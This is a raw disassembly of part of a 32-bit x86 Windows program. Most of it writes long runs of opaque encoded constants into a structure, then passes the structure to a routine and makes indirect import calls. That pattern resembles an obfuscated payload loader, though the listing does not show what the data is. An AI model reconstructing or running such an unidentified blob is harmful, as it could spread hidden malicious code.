  405b87:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405b8a:	c7 81 b8 01 00 00 a1 	movl   $0xe67078a1,0x1b8(%ecx)
  405b91:	78 70 e6 
  405b94:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405b97:	c7 82 bc 01 00 00 a1 	movl   $0xccf577a1,0x1bc(%edx)
  405b9e:	77 f5 cc 
  405ba1:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405ba4:	c7 80 c0 01 00 00 e6 	movl   $0x479f6fe6,0x1c0(%eax)
  405bab:	6f 9f 47 
  405bae:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405bb1:	c7 81 c4 01 00 00 cb 	movl   $0xbc7c73cb,0x1c4(%ecx)
  405bb8:	73 7c bc 
  405bbb:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405bbe:	c7 82 c8 01 00 00 22 	movl   $0x14f1b422,0x1c8(%edx)
  405bc5:	b4 f1 14 
  405bc8:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405bcb:	c7 80 cc 01 00 00 2a 	movl   $0xcce5282a,0x1cc(%eax)
  405bd2:	28 e5 cc 
  405bd5:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405bd8:	c7 41 48 2a 06 c9 46 	movl   $0x46c9062a,0x48(%ecx)
  405bdf:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405be2:	c7 42 4c 6f fe c2 cc 	movl   $0xccc2fe6f,0x4c(%edx)
  405be9:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405bec:	c7 80 d0 01 00 00 2a 	movl   $0x47f5d32a,0x1d0(%eax)
  405bf3:	d3 f5 47 
  405bf6:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405bf9:	c7 81 d4 01 00 00 a1 	movl   $0x4f34f4a1,0x1d4(%ecx)
  405c00:	f4 34 4f 
  405c03:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405c06:	c7 82 d8 01 00 00 f0 	movl   $0x4fa2fcf0,0x1d8(%edx)
  405c0d:	fc a2 4f 
  405c10:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405c13:	c7 80 dc 01 00 00 5e 	movl   $0x970a455e,0x1dc(%eax)
  405c1a:	45 0a 97 
  405c1d:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405c20:	c7 81 e0 01 00 00 22 	movl   $0x32f58f22,0x1e0(%ecx)
  405c27:	8f f5 32 
  405c2a:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405c2d:	c7 82 e4 01 00 00 da 	movl   $0x57aafcda,0x1e4(%edx)
  405c34:	fc aa 57 
  405c37:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405c3a:	c7 80 e8 01 00 00 20 	movl   $0x4745b420,0x1e8(%eax)
  405c41:	b4 45 47 
  405c44:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405c47:	c7 81 ec 01 00 00 a1 	movl   $0x87e77a1,0x1ec(%ecx)
  405c4e:	77 7e 08 
  405c51:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405c54:	c7 82 f0 01 00 00 a5 	movl   $0x44e2fca5,0x1f0(%edx)
  405c5b:	fc e2 44 
  405c5e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405c61:	c7 80 f4 01 00 00 eb 	movl   $0x4c7c5feb,0x1f4(%eax)
  405c68:	5f 7c 4c 
  405c6b:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405c6e:	c7 41 28 a1 77 a1 2d 	movl   $0x2da177a1,0x28(%ecx)
  405c75:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405c78:	c7 42 2c a1 fe 12 10 	movl   $0x1012fea1,0x2c(%edx)
  405c7f:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405c82:	c7 40 70 ee 33 1c 77 	movl   $0x771c33ee,0x70(%eax)
  405c89:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405c8c:	c7 41 74 a3 77 f5 1e 	movl   $0x1ef577a3,0x74(%ecx)
  405c93:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405c96:	c7 82 80 01 00 00 b9 	movl   $0x470df4b9,0x180(%edx)
  405c9d:	f4 0d 47 
  405ca0:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405ca3:	c7 80 84 01 00 00 ae 	movl   $0x4723f2ae,0x184(%eax)
  405caa:	f2 23 47 
  405cad:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405cb0:	c7 81 88 01 00 00 a1 	movl   $0x1e9377a1,0x188(%ecx)
  405cb7:	77 93 1e 
  405cba:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405cbd:	c7 82 8c 01 00 00 c7 	movl   $0xc4933ec7,0x18c(%edx)
  405cc4:	3e 93 c4 
  405cc7:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405cca:	c7 80 88 00 00 00 51 	movl   $0x47f57651,0x88(%eax)
  405cd1:	76 f5 47 
  405cd4:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405cd7:	c7 81 8c 00 00 00 5e 	movl   $0x27ca75e,0x8c(%ecx)
  405cde:	a7 7c 02 
  405ce1:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405ce4:	c7 82 90 01 00 00 58 	movl   $0xfa887758,0x190(%edx)
  405ceb:	77 88 fa 
  405cee:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405cf1:	c7 80 94 01 00 00 2a 	movl   $0x80e5382a,0x194(%eax)
  405cf8:	38 e5 80 
  405cfb:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405cfe:	c7 81 98 01 00 00 a0 	movl   $0x46f570a0,0x198(%ecx)
  405d05:	70 f5 46 
  405d08:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405d0b:	c7 82 9c 01 00 00 a1 	movl   $0x53bafca1,0x19c(%edx)
  405d12:	fc ba 53 
  405d15:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405d18:	c7 80 a0 01 00 00 48 	movl   $0x47f4f748,0x1a0(%eax)
  405d1f:	f7 f4 47 
  405d22:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405d25:	c7 81 a4 01 00 00 a1 	movl   $0x961d2da1,0x1a4(%ecx)
  405d2c:	2d 1d 96 
  405d2f:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405d32:	c7 42 10 48 ae f7 47 	movl   $0x47f7ae48,0x10(%edx)
  405d39:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405d3c:	c7 40 14 a1 2d 1d 26 	movl   $0x261d2da1,0x14(%eax)
  405d43:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405d46:	c7 81 a8 01 00 00 a1 	movl   $0xb8f577a1,0x1a8(%ecx)
  405d4d:	77 f5 b8 
  405d50:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405d53:	c7 82 ac 01 00 00 d6 	movl   $0x107e67d6,0x1ac(%edx)
  405d5a:	67 7e 10 
  405d5d:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405d60:	c7 80 b0 01 00 00 a9 	movl   $0x438788a9,0x1b0(%eax)
  405d67:	88 87 43 
  405d6a:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405d6d:	b8 5e a7 76 bf       	mov    $0xbf76a75e,%eax
  405d72:	89 81 b4 01 00 00    	mov    %eax,0x1b4(%ecx)
  405d78:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405d7b:	c7 82 a0 02 00 00 f5 	movl   $0xc42588f5,0x2a0(%edx)
  405d82:	88 25 c4 
  405d85:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405d88:	c7 81 a4 02 00 00 65 	movl   $0xaf366b65,0x2a4(%ecx)
  405d8f:	6b 36 af 
  405d92:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405d95:	c7 82 80 00 00 00 b1 	movl   $0x44e49eb1,0x80(%edx)
  405d9c:	9e e4 44 
  405d9f:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405da2:	c7 81 84 00 00 00 a1 	movl   $0xafaf77a1,0x84(%ecx)
  405da9:	77 af af 
  405dac:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405daf:	c7 82 a8 02 00 00 6a 	movl   $0xb80a8a6a,0x2a8(%edx)
  405db6:	8a 0a b8 
  405db9:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405dbc:	c7 81 ac 02 00 00 ca 	movl   $0x298712ca,0x2ac(%ecx)
  405dc3:	12 87 29 
  405dc6:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405dc9:	c7 82 90 00 00 00 b1 	movl   $0x4b88f4b1,0x90(%edx)
  405dd0:	f4 88 4b 
  405dd3:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405dd6:	c7 81 94 00 00 00 a1 	movl   $0x23e502a1,0x94(%ecx)
  405ddd:	02 e5 23 
  405de0:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405de3:	c7 82 b0 02 00 00 c4 	movl   $0x75c61bc4,0x2b0(%edx)
  405dea:	1b c6 75 
  405ded:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405df0:	c7 81 b4 02 00 00 a1 	movl   $0xba009fa1,0x2b4(%ecx)
  405df7:	9f 00 ba 
  405dfa:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405dfd:	c7 42 40 26 8b fa 47 	movl   $0x47fa8b26,0x40(%edx)
  405e04:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405e07:	c7 41 44 a1 fc b8 4f 	movl   $0x4fb8fca1,0x44(%ecx)
  405e0e:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405e11:	c7 82 b8 02 00 00 5e 	movl   $0x35b6885e,0x2b8(%edx)
  405e18:	88 b6 35 
  405e1b:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405e1e:	c7 81 bc 02 00 00 c4 	movl   $0x228116c4,0x2bc(%ecx)
  405e25:	16 81 22 
  405e28:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405e2b:	c7 82 a0 00 00 00 b1 	movl   $0x7baefcb1,0xa0(%edx)
  405e32:	fc ae 7b 
  405e35:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405e38:	c7 81 a4 00 00 00 28 	movl   $0xccf92a28,0xa4(%ecx)
  405e3f:	2a f9 cc 
  405e42:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405e45:	c7 82 a8 00 00 00 ee 	movl   $0x411c5fee,0xa8(%edx)
  405e4c:	5f 1c 41 
  405e4f:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405e52:	c7 81 ac 00 00 00 a3 	movl   $0x1df577a3,0xac(%ecx)
  405e59:	77 f5 1d 
  405e5c:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405e5f:	c7 82 b0 00 00 00 49 	movl   $0x47f4b049,0xb0(%edx)
  405e66:	b0 f4 47 
  405e69:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405e6c:	c7 81 b4 00 00 00 a1 	movl   $0x4f8288a1,0xb4(%ecx)
  405e73:	88 82 4f 
  405e76:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405e79:	c7 82 b8 00 00 00 5e 	movl   $0x2df9005e,0xb8(%edx)
  405e80:	00 f9 2d 
  405e83:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405e86:	c7 81 bc 00 00 00 a1 	movl   $0x2df51da1,0xbc(%ecx)
  405e8d:	1d f5 2d 
  405e90:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405e93:	c7 82 c0 00 00 00 a5 	movl   $0x2df51da5,0xc0(%edx)
  405e9a:	1d f5 2d 
  405e9d:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405ea0:	c7 81 c4 00 00 00 a1 	movl   $0xb8f51da1,0xc4(%ecx)
  405ea7:	1d f5 b8 
  405eaa:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405ead:	c7 82 c8 00 00 00 d4 	movl   $0x320a67d4,0xc8(%edx)
  405eb4:	67 0a 32 
  405eb7:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405eba:	bf 2a 38 e1 ae       	mov    $0xaee1382a,%edi
  405ebf:	c7 81 cc 00 00 00 ad 	movl   $0xc42588ad,0xcc(%ecx)
  405ec6:	88 25 c4 
  405ec9:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405ecc:	c7 82 d0 00 00 00 59 	movl   $0xc2fa7659,0xd0(%edx)
  405ed3:	76 fa c2 
  405ed6:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405ed9:	c7 81 d4 00 00 00 91 	movl   $0xb80a8891,0xd4(%ecx)
  405ee0:	88 0a b8 
  405ee3:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405ee6:	89 ba d8 00 00 00    	mov    %edi,0xd8(%edx)
  405eec:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405eef:	c7 81 dc 00 00 00 48 	movl   $0x47f57648,0xdc(%ecx)
  405ef6:	76 f5 47 
  405ef9:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405efc:	c7 82 e0 00 00 00 fb 	movl   $0x46639ffb,0xe0(%edx)
  405f03:	9f 63 46 
  405f06:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f09:	ba a1 77 0a 30       	mov    $0x300a77a1,%edx
  405f0e:	89 91 e4 00 00 00    	mov    %edx,0xe4(%ecx)
  405f14:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f17:	c7 81 e8 00 00 00 a5 	movl   $0x4fbafca5,0xe8(%ecx)
  405f1e:	fc ba 4f 
  405f21:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f24:	c7 81 ec 00 00 00 5e 	movl   $0x970a465e,0xec(%ecx)
  405f2b:	46 0a 97 
  405f2e:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f31:	c7 81 f0 00 00 00 2a 	movl   $0x4809f02a,0xf0(%ecx)
  405f38:	f0 09 48 
  405f3b:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f3e:	c7 81 f4 00 00 00 a1 	movl   $0x79f77a1,0xf4(%ecx)
  405f45:	77 9f 07 
  405f48:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f4b:	c7 81 f8 00 00 00 c9 	movl   $0x47c577c9,0xf8(%ecx)
  405f52:	77 c5 47 
  405f55:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f58:	c7 81 fc 00 00 00 a1 	movl   $0xc4fafca1,0xfc(%ecx)
  405f5f:	fc fa c4 
  405f62:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f65:	c7 81 00 01 00 00 60 	movl   $0x2da42760,0x100(%ecx)
  405f6c:	27 a4 2d 
  405f6f:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f72:	c7 81 04 01 00 00 a1 	movl   $0xc40efea1,0x104(%ecx)
  405f79:	fe 0e c4 
  405f7c:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f7f:	c7 81 08 01 00 00 62 	movl   $0xcca67362,0x108(%ecx)
  405f86:	73 a6 cc 
  405f89:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f8c:	c7 81 0c 01 00 00 f6 	movl   $0x750a7ff6,0x10c(%ecx)
  405f93:	7f 0a 75 
  405f96:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405f99:	89 81 10 01 00 00    	mov    %eax,0x110(%ecx)
  405f9f:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405fa2:	c7 81 14 01 00 00 a1 	movl   $0x27078a1,0x114(%ecx)
  405fa9:	78 70 02 
  405fac:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405faf:	c7 81 18 01 00 00 a0 	movl   $0xccf577a0,0x118(%ecx)
  405fb6:	77 f5 cc 
  405fb9:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405fbc:	c7 81 1c 01 00 00 ee 	movl   $0xaf1c63ee,0x11c(%ecx)
  405fc3:	63 1c af 
  405fc6:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405fc9:	c7 41 68 b1 f6 34 97 	movl   $0x9734f6b1,0x68(%ecx)
  405fd0:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405fd3:	c7 41 6c a1 77 f5 ce 	movl   $0xcef577a1,0x6c(%ecx)
  405fda:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  405fdd:	b9 a0 77 f5 1d       	mov    $0x1df577a0,%ecx
  405fe2:	89 8b 20 01 00 00    	mov    %ecx,0x120(%ebx)
  405fe8:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  405feb:	c7 83 24 01 00 00 49 	movl   $0x47f42449,0x124(%ebx)
  405ff2:	24 f4 47 
  405ff5:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  405ff8:	c7 83 28 01 00 00 a1 	movl   $0x5fb2fea1,0x128(%ebx)
  405fff:	fe b2 5f 
  406002:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  406005:	c7 83 2c 01 00 00 cb 	movl   $0x487e77cb,0x12c(%ebx)
  40600c:	77 7e 48 
  40600f:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  406012:	c7 43 60 28 38 fd c4 	movl   $0xc4fd3828,0x60(%ebx)
  406019:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  40601c:	c7 43 64 60 67 7c 08 	movl   $0x87c6760,0x64(%ebx)
  406023:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  406026:	c7 43 78 28 38 dd c4 	movl   $0xc4dd3828,0x78(%ebx)
  40602d:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  406030:	c7 43 7c dc 67 f4 32 	movl   $0x32f467dc,0x7c(%ebx)
  406037:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  40603a:	c7 83 30 01 00 00 5e 	movl   $0xb8a1065e,0x130(%ebx)
  406041:	06 a1 b8 
  406044:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  406047:	c7 83 34 01 00 00 d4 	movl   $0x300a7fd4,0x134(%ebx)
  40604e:	7f 0a 30 
  406051:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  406054:	c7 83 38 01 00 00 a5 	movl   $0x4fa2fca5,0x138(%ebx)
  40605b:	fc a2 4f 
  40605e:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  406061:	c7 83 3c 01 00 00 5e 	movl   $0x970a455e,0x13c(%ebx)
  406068:	45 0a 97 
  40606b:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  40606e:	c7 43 08 48 a1 f7 47 	movl   $0x47f7a148,0x8(%ebx)
  406075:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  406078:	c7 43 0c a1 2e 7c 8c 	movl   $0x8c7c2ea1,0xc(%ebx)
  40607f:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  406082:	c7 83 40 01 00 00 22 	movl   $0x48f58f22,0x140(%ebx)
  406089:	8f f5 48 
  40608c:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  40608f:	c7 83 44 01 00 00 24 	movl   $0x47f46024,0x144(%ebx)
  406096:	60 f4 47 
  406099:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  40609c:	c7 43 58 60 3f 7c 08 	movl   $0x87c3f60,0x58(%ebx)
  4060a3:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4060a6:	c7 43 5c ad f4 34 03 	movl   $0x334f4ad,0x5c(%ebx)
  4060ad:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4060b0:	c7 83 48 01 00 00 a1 	movl   $0x21e2fca1,0x148(%ebx)
  4060b7:	fc e2 21 
  4060ba:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4060bd:	c7 83 4c 01 00 00 2a 	movl   $0x21f33d2a,0x14c(%ebx)
  4060c4:	3d f3 21 
  4060c7:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4060ca:	c7 43 30 cb 88 0a 97 	movl   $0x970a88cb,0x30(%ebx)
  4060d1:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4060d4:	c7 43 34 22 8f f5 32 	movl   $0x32f58f22,0x34(%ebx)
  4060db:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4060de:	89 bb f8 01 00 00    	mov    %edi,0x1f8(%ebx)
  4060e4:	8b 7d d0             	mov    -0x30(%ebp),%edi
  4060e7:	c7 87 fc 01 00 00 9c 	movl   $0x47f5769c,0x1fc(%edi)
  4060ee:	76 f5 47 
  4060f1:	8b 7d d0             	mov    -0x30(%ebp),%edi
  4060f4:	c7 87 00 02 00 00 fb 	movl   $0x47839ffb,0x200(%edi)
  4060fb:	9f 83 47 
  4060fe:	8b 7d d0             	mov    -0x30(%ebp),%edi
  406101:	89 97 04 02 00 00    	mov    %edx,0x204(%edi)
  406107:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40610a:	c7 82 08 02 00 00 b1 	movl   $0x4fa2fcb1,0x208(%edx)
  406111:	fc a2 4f 
  406114:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406117:	c7 82 0c 02 00 00 5e 	movl   $0xb8f1055e,0x20c(%edx)
  40611e:	05 f1 b8 
  406121:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406124:	c7 82 10 02 00 00 71 	movl   $0x470df471,0x210(%edx)
  40612b:	f4 0d 47 
  40612e:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406131:	c7 82 14 02 00 00 d4 	movl   $0x87e3dd4,0x214(%edx)
  406138:	3d 7e 08 
  40613b:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40613e:	c7 82 18 02 00 00 b5 	movl   $0x46c29eb5,0x218(%edx)
  406145:	9e c2 46 
  406148:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40614b:	c7 82 1c 02 00 00 a1 	movl   $0xafaf77a1,0x21c(%edx)
  406152:	77 af af 
  406155:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406158:	c7 82 20 02 00 00 f9 	movl   $0x47f577f9,0x220(%edx)
  40615f:	77 f5 47 
  406162:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406165:	c7 82 24 02 00 00 cb 	movl   $0x107e77cb,0x224(%edx)
  40616c:	77 7e 10 
  40616f:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406172:	c7 82 28 02 00 00 a9 	movl   $0x438788a9,0x228(%edx)
  406179:	88 87 43 
  40617c:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40617f:	89 82 2c 02 00 00    	mov    %eax,0x22c(%edx)
  406185:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406188:	c7 80 30 02 00 00 a1 	movl   $0xccd802a1,0x230(%eax)
  40618f:	02 d8 cc 
  406192:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406195:	c7 82 34 02 00 00 ee 	movl   $0x31c5fee,0x234(%edx)
  40619c:	5f 1c 03 
  40619f:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4061a2:	c7 40 18 a3 77 f5 17 	movl   $0x17f577a3,0x18(%eax)
  4061a9:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4061ac:	c7 42 1c cb 37 9d 47 	movl   $0x479d37cb,0x1c(%edx)
  4061b3:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4061b6:	89 88 38 02 00 00    	mov    %ecx,0x238(%eax)
  4061bc:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4061bf:	c7 81 3c 02 00 00 49 	movl   $0x47f54c49,0x23c(%ecx)
  4061c6:	4c f5 47 
  4061c9:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4061cc:	c7 82 40 02 00 00 a1 	movl   $0x107e23a1,0x240(%edx)
  4061d3:	23 7e 10 
  4061d6:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4061d9:	c7 80 44 02 00 00 a9 	movl   $0xb8c788a9,0x244(%eax)
  4061e0:	88 c7 b8 
  4061e3:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4061e6:	c7 81 48 02 00 00 71 	movl   $0x63c9f671,0x248(%ecx)
  4061ed:	f6 c9 63 
  4061f0:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4061f3:	c7 82 4c 02 00 00 a2 	movl   $0x47f576a2,0x24c(%edx)
  4061fa:	76 f5 47 
  4061fd:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406200:	c7 40 20 b1 77 f5 80 	movl   $0x80f577b1,0x20(%eax)
  406207:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40620a:	c7 41 24 a5 53 f5 57 	movl   $0x57f553a5,0x24(%ecx)
  406211:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406214:	c7 82 50 02 00 00 ae 	movl   $0xba47f2ae,0x250(%edx)
  40621b:	f2 47 ba 
  40621e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406221:	c7 80 54 02 00 00 5e 	movl   $0x107e885e,0x254(%eax)
  406228:	88 7e 10 
  40622b:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40622e:	c7 81 58 02 00 00 a9 	movl   $0x4f37f4a9,0x258(%ecx)
  406235:	f4 37 4f 
  406238:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40623b:	c7 82 5c 02 00 00 2a 	movl   $0x843c752a,0x25c(%edx)
  406242:	75 3c 84 
  406245:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406248:	c7 80 60 02 00 00 2a 	movl   $0xaedd382a,0x260(%eax)
  40624f:	38 dd ae 
  406252:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  406255:	c7 81 64 02 00 00 a0 	movl   $0x47f576a0,0x264(%ecx)
  40625c:	76 f5 47 
  40625f:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406262:	c7 82 68 02 00 00 fb 	movl   $0x47fb9ffb,0x268(%edx)
  406269:	9f fb 47 
  40626c:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40626f:	c7 80 6c 02 00 00 a1 	movl   $0x479f77a1,0x26c(%eax)
  406276:	77 9f 47 
  406279:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40627c:	c7 81 70 02 00 00 2a 	movl   $0xb8fd202a,0x270(%ecx)
  406283:	20 fd b8 
  406286:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406289:	6a 01                	push   $0x1
  40628b:	6a 01                	push   $0x1
  40628d:	c7 82 74 02 00 00 93 	movl   $0xae258893,0x274(%edx)
  406294:	88 25 ae 
  406297:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40629a:	c7 80 78 02 00 00 2d 	movl   $0xb80a8a2d,0x278(%eax)
  4062a1:	8a 0a b8 
  4062a4:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4062a7:	c7 81 7c 02 00 00 1f 	movl   $0x7e5771f,0x27c(%ecx)
  4062ae:	77 e5 07 
  4062b1:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4062b4:	c7 82 80 02 00 00 a1 	movl   $0x7f74daa1,0x280(%edx)
  4062bb:	da 74 7f 
  4062be:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4062c1:	c7 80 84 02 00 00 f4 	movl   $0xc419fcf4,0x284(%eax)
  4062c8:	fc 19 c4 
  4062cb:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4062ce:	c7 81 88 02 00 00 d4 	movl   $0x3f7480d4,0x288(%ecx)
  4062d5:	80 74 3f 
  4062d8:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4062db:	c7 82 8c 02 00 00 a5 	movl   $0x11f99ba5,0x28c(%edx)
  4062e2:	9b f9 11 
  4062e5:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4062e8:	c7 40 38 6e fc ca ce 	movl   $0xcecafc6e,0x38(%eax)
  4062ef:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4062f2:	c7 41 3c fe 63 ad ce 	movl   $0xcead63fe,0x3c(%ecx)
  4062f9:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4062fc:	c7 82 90 02 00 00 2c 	movl   $0x761b022c,0x290(%edx)
  406303:	02 1b 76 
  406306:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406309:	c7 80 94 02 00 00 57 	movl   $0x11a32157,0x294(%eax)
  406310:	21 a3 11 
  406313:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  406316:	c7 81 98 02 00 00 f5 	movl   $0x47f51ff5,0x298(%ecx)
  40631d:	1f f5 47 
  406320:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406323:	c7 82 9c 02 00 00 a5 	movl   $0x16a777a5,0x29c(%edx)
  40632a:	77 a7 16 
  40632d:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406330:	50                   	push   %eax
  406331:	e8 66 db ff ff       	call   0x403e9c
  406336:	8b 3d 40 10 40 00    	mov    0x401040,%edi
  40633c:	89 45 a8             	mov    %eax,-0x58(%ebp)
  40633f:	ff d7                	call   *%edi
  406341:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406344:	8d 45 bc             	lea    -0x44(%ebp),%eax
  406347:	8b 11                	mov    (%ecx),%edx
  406349:	52                   	push   %edx
  40634a:	50                   	push   %eax
  40634b:	ff 15 5c 11 40 00    	call   *0x40115c
  406351:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  406354:	3b ce                	cmp    %esi,%ecx
  406356:	74 1f                	je     0x406377
  406358:	66 83 39 01          	cmpw   $0x1,(%ecx)
  40635c:	75 19                	jne    0x406377
  40635e:	8b 59 14             	mov    0x14(%ecx),%ebx
  406361:	8b 41 10             	mov    0x10(%ecx),%eax
  406364:	f7 db                	neg    %ebx
  406366:	3b d8                	cmp    %eax,%ebx
  406368:	72 09                	jb     0x406373
  40636a:	ff 15 90 10 40 00    	call   *0x401090
  406370:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  406373:	8b c3                	mov    %ebx,%eax
